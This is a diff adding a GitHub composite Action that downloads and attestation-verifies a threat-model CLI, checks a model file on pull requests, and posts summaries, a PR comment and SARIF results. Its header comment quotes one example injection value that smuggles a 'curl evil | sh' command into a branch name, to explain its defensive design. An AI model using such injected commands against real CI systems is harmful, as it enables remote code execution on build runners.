@@ -1,0 +1,229 @@
+# threat-model check: runs `threat check` on a pull request, writes a job
+# summary and annotations, and can update one PR comment and upload SARIF.
+# See action/README.md and docs/ci.md.
+#
+# Security notes (why the steps look the way they do):
+# - Inputs and event fields reach scripts only through `env:`, never as
+#   `${{ }}` inside `run:`. An expression in `run:` is pasted into the
+#   script before bash sees it, so a branch name or input like
+#   `"; curl evil | sh #` would run as code. An env var is only ever data.
+# - The binary is verified with `gh attestation verify` before it runs. If
+#   verification fails, the step fails and nothing else runs.
+# - Output that can contain model text (from the pull request) is printed
+#   with workflow commands switched off, so it can't send commands to the
+#   runner. Only `--format github`, which escapes everything, runs with
+#   commands on.
+# - This Action never checks out code and never needs secrets. Run it on
+#   `pull_request`, not `pull_request_target`.
+name: threat-model check
+description: Check a threat model in a pull request and summarise what changed.
+author: open-security-tooling
+branding:
+  icon: shield
+  color: blue
+
+inputs:
+  version:
+    description: "threat release to use, e.g. v1.2.0. `latest` is the newest release; pin a version for reproducible runs."
+    default: latest
+  file:
+    description: Model file, relative to the repository root.
+    default: threatmodel.yaml
+  base:
+    description: "Git ref or SHA to compare with. Empty means the pull request's base commit, or no comparison outside pull requests."
+    default: ""
+  strict:
+    description: Treat "needs review" warnings as errors.
+    default: "false"
+  comment:
+    description: "Post or update one PR comment with the summary: `true`, `false`, or `auto` (on pull_request events only). Needs `pull-requests: write`."
+    default: auto
+  sarif:
+    description: "Upload findings and open threats to GitHub code scanning. Needs `security-events: write`."
+    default: "false"
+  token:
+    description: Token for downloading and verifying the release and for the PR comment. The default job token is enough.
+    default: ${{ github.token }}
+
+outputs:
+  ok:
+    description: "`true` when the check found no errors."
+    value: ${{ steps.check.outputs.ok }}
+  exit-code:
+    description: "`threat check` exit code: 0 ok, 1 findings, 2 couldn't run."
+    value: ${{ steps.check.outputs.exit-code }}
+  result-file:
+    description: Path to the JSON result.
+    value: ${{ steps.check.outputs.result-file }}
+  summary-file:
+    description: Path to the Markdown summary (the PR comment body).
+    value: ${{ steps.check.outputs.summary-file }}
+  sarif-file:
+    description: Path to the SARIF file, when `sarif` is true.
+    value: ${{ steps.check.outputs.sarif-file }}
+
+runs:
+  using: composite
+  steps:
+    - name: Install threat and verify where it was built
+      id: install
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.token }}
+        VERSION: ${{ inputs.version }}
+        EVENT: ${{ github.event_name }}
+        SOURCE_REPO: open-security-tooling/threat-model
+      run: |
+        set -euo pipefail
+        if [ "$EVENT" = pull_request_target ]; then
+          echo "::warning title=threat-model check::This workflow runs on pull_request_target. That gives pull requests from forks a token that can write. Use pull_request instead; see docs/ci.md."
+        fi
+        command -v gh >/dev/null || { echo "::error title=threat-model check::The GitHub CLI (gh) isn't installed on this runner. Install it, or use a GitHub-hosted runner."; exit 1; }
+
+        case "$RUNNER_OS" in
+          Linux) os=linux ;; macOS) os=darwin ;; Windows) os=windows ;;
+          *) echo "::error title=threat-model check::No threat release for runner OS $RUNNER_OS."; exit 1 ;;
+        esac
+        case "$RUNNER_ARCH" in
+          X64) arch=amd64 ;; ARM64) arch=arm64 ;;
+          *) echo "::error title=threat-model check::No threat release for runner architecture $RUNNER_ARCH."; exit 1 ;;
+        esac
+        ext=""; [ "$os" = windows ] && ext=.exe
+        asset="threat_${os}_${arch}${ext}"
+
+        tag="$VERSION"
+        if [ "$tag" = latest ]; then
+          tag=$(gh release view --repo "$SOURCE_REPO" --json tagName --jq .tagName)
+        fi
+        if ! [[ "$tag" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]]; then
+          echo "::error title=threat-model check::'version' must be a release tag like v1.2.0, or latest."
+          exit 1
+        fi
+
+        dir="$RUNNER_TEMP/threat-model-bin"
+        rm -rf "$dir" && mkdir -p "$dir"
+        gh release download "$tag" --repo "$SOURCE_REPO" --pattern "$asset" --dir "$dir"
+
+        # Fail closed: the binary must have been built by our release
+        # workflow, from this tag, on a GitHub-hosted runner.
+        if ! gh attestation verify "$dir/$asset" \
+            --repo "$SOURCE_REPO" \
+            --signer-workflow "$SOURCE_REPO/.github/workflows/release.yml" \
+            --source-ref "refs/tags/$tag" \
+            --deny-self-hosted-runners; then
+          rm -f "$dir/$asset"
+          echo "::error title=threat-model check::$asset from $tag failed verification, so it wasn't run. Don't use it; report it at https://github.com/$SOURCE_REPO/security."
+          exit 1
+        fi
+        chmod +x "$dir/$asset"
+        echo "path=$dir/$asset" >> "$GITHUB_OUTPUT"
+        echo "Using threat $tag ($asset), verified."
+
+    - name: Check the threat model
+      id: check
+      shell: bash
+      env:
+        THREAT: ${{ steps.install.outputs.path }}
+        FILE: ${{ inputs.file }}
+        BASE: ${{ inputs.base }}
+        PR_BASE: ${{ github.event.pull_request.base.sha }}
+        STRICT: ${{ inputs.strict }}
+        SARIF: ${{ inputs.sarif }}
+      run: |
+        set -uo pipefail
+        out="$RUNNER_TEMP/threat-model"
+        rm -rf "$out" && mkdir -p "$out"
+        base="${BASE:-$PR_BASE}"
+        args=(check --file "$FILE")
+        if [ -n "$base" ]; then args+=(--base "$base"); fi
+        if [ "$STRICT" = true ]; then args+=(--strict); fi
+
+        # Annotations on the diff. This output is escaped by threat, so it's
+        # the one run where workflow commands stay on; errors go elsewhere.
+        "$THREAT" "${args[@]}" --format github 2>/dev/null
+
+        # Everything below can contain text from the pull request, so turn
+        # workflow commands off while it prints.
+        stop="$(od -An -tx1 -N16 /dev/urandom | tr -d ' \n')"
+        echo "::stop-commands::$stop"
+        "$THREAT" "${args[@]}" --json > "$out/result.json"
+        code=$?
+        "$THREAT" "${args[@]}" --format summary > "$out/summary.md"
+        if [ "$SARIF" = true ]; then
+          "$THREAT" "${args[@]}" --format sarif > "$out/results.sarif"
+          echo "sarif-file=$out/results.sarif" >> "$GITHUB_OUTPUT"
+        fi
+        echo "::$stop::"
+
+        cat "$out/summary.md" >> "$GITHUB_STEP_SUMMARY"
+        ok=false; [ "$code" -eq 0 ] && ok=true
+        {
+          echo "exit-code=$code"
+          echo "ok=$ok"
+          echo "result-file=$out/result.json"
+          echo "summary-file=$out/summary.md"
+        } >> "$GITHUB_OUTPUT"
+        if [ "$code" -ge 2 ]; then
+          echo "::error title=threat-model check::threat check couldn't run (exit code $code). Its output is in the log above."
+        fi
+
+    - name: Update the pull request comment
+      if: >-
+        inputs.comment == 'true' ||
+        (inputs.comment == 'auto' && github.event_name == 'pull_request')
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.token }}
+        REPO: ${{ github.repository }}
+        PR: ${{ github.event.pull_request.number }}
+        HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+        BODY: ${{ steps.check.outputs.summary-file }}
+        MARKER: "<!-- threat-model-summary -->"
+      run: |
+        set -euo pipefail
+        if [ -z "$PR" ]; then
+          echo "Not a pull request, so there's no comment to post."
+          exit 0
+        fi
+        if [ "$HEAD_REPO" != "$REPO" ]; then
+          echo "::notice title=threat-model check::This pull request comes from a fork, so its token can't comment. The summary is in the job summary. To comment on fork PRs, see docs/ci.md."
+          exit 0
+        fi
+        # Only update a comment a bot posted: anyone can write a comment
+        # containing the marker.
+        id=$(gh api --paginate "repos/$REPO/issues/$PR/comments" \
+          --jq ".[] | select(.user.type == \"Bot\" and (.body | startswith(\"$MARKER\"))) | .id" | sed -n 1p)
+        payload="$RUNNER_TEMP/threat-model/comment.json"
+        jq -n --rawfile body "$BODY" '{body: $body}' > "$payload"
+        denied() {
+          echo "::error title=threat-model check::Couldn't post the PR comment. Give the job 'permissions: pull-requests: write', or set 'comment: false'."
+          exit 1
+        }
+        if [ -n "$id" ]; then
+          gh api --method PATCH "repos/$REPO/issues/comments/$id" --input "$payload" > /dev/null || denied
+          echo "Updated the threat model comment."
+        else
+          gh api --method POST "repos/$REPO/issues/$PR/comments" --input "$payload" > /dev/null || denied
+          echo "Posted the threat model comment."
+        fi
+
+    # GitHub-owned action, pinned by full commit SHA (v4.38.3, released
+    # 2026-10-08). Skipped on fork PRs, whose token is read-only.
+    - name: Upload to code scanning
+      if: >-
+        inputs.sarif == 'true' && steps.check.outputs.sarif-file != '' &&
+        (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository)
+      uses: github/codeql-action/upload-sarif@24c54180a607b1449ed407dd24f251e4e9147c8d # v4.38.3
+      with:
+        sarif_file: ${{ steps.check.outputs.sarif-file }}
+        category: threat-model
+
+    - name: Fail if the check failed
+      shell: bash
+      env:
+        CODE: ${{ steps.check.outputs.exit-code }}
+      run: |
+        if [ "${CODE:-2}" != 0 ]; then
+          echo "threat check found problems (exit code ${CODE:-2}). See the job summary for what to fix."
+          exit "${CODE:-2}"
+        fi
